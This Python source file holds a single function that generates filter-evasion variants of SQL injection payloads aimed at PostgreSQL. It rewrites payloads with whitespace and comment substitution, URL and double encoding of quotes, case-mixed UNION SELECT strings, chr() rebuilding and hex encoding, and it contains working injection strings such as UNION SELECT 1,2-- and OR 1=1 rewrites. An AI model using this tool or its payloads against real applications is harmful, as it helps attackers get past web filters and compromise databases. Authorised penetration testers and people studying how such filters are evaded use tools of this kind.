import re
from urllib.parse import quote, quote_plus


def variants_pg(payload: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    out.append((payload, "original"))
    out.append((payload.replace(" ", "+"), "plus_space"))
    out.append((payload.replace(" ", "\t"), "tab"))
    out.append((payload.replace(" ", "\n"), "newline"))
    out.append((payload.replace(" ", "\x0b"), "vtab"))
    out.append((payload.replace(" ", "\r"), "cr"))
    out.append((payload.replace(" ", "\x0c"), "ff"))
    out.append((payload.replace(" ", "/**/"), "comment_block"))
    out.append((payload.replace(" ", "%09").replace("'", "%27"), "tab_encoded_quote"))

    if "'" not in payload:
        return out

    prefix, rest = payload.split("'", 1)
    r = rest

    out.append((prefix + "%27" + quote_plus(r), "pre_plus_encoded"))
    out.append((prefix + "%27" + r.replace(" ", "%09"), "pre_tab_encoded"))
    out.append((prefix + "%27" + r.replace(" ", "%0a"), "pre_newline_encoded"))
    out.append((prefix + "%27" + r.replace(" ", "/**/"), "pre_comment_encoded"))
    out.append((prefix + "%2527" + r, "double_encoded_quote"))

    if re.search(r"\bor\b", r, re.I):
        if re.search(r"1\s*=\s*1", r):
            out.append((prefix + "'" + re.sub(r"(?i)1\s*=\s*1", "true", r, count=1), "or_pg_true"))
        out.append((prefix + "'" + r.replace(" ", "\n", 1), "or_first_space_to_newline"))

    if re.search(r"\bunion\b", r, re.I):
        out.append((f"{prefix}' UnIoN SeLeCt 1,2--", "case_mix_union"))
        out.append((quote(f"{prefix}' UnIoN SeLeCt 1,2--", safe=""), "case_mix_union_encoded"))
        out.append((f"{prefix}' UNION SELECT chr(49),chr(50)--", "chr_pg"))
        out.append((quote(f"{prefix}' UNION SELECT chr(49),chr(50)--", safe=""), "chr_pg_encoded"))
        out.append((f"{prefix}' UnIoN SeLeCt 1,2--", "case_random_union"))
        out.append((quote(f"{prefix}' UnIoN SeLeCt 1,2--", safe=""), "case_random_union_encoded"))
        out.append((f"{prefix}'||' UNION SELECT 1,2--", "concat_pg"))
        out.append((quote(f"{prefix}'||' UNION SELECT 1,2--", safe=""), "concat_pg_encoded"))

    hex_payload = prefix + "'" + r.replace(" ", "#")
    h = hex_payload.encode("utf-8").hex()
    out.append((prefix + "0x" + h, "account_hex_prefix"))
    out.append((prefix + "0x" + (h[:48] if len(h) > 48 else h), "account_hex_0x_partial"))
    out.append((prefix + "x" + h, "account_hex_x"))

    seen: set[str] = set()
    deduped: list[tuple[str, str]] = []
    for p, name in out:
        if p not in seen:
            seen.add(p)
            deduped.append((p, name))
    return deduped
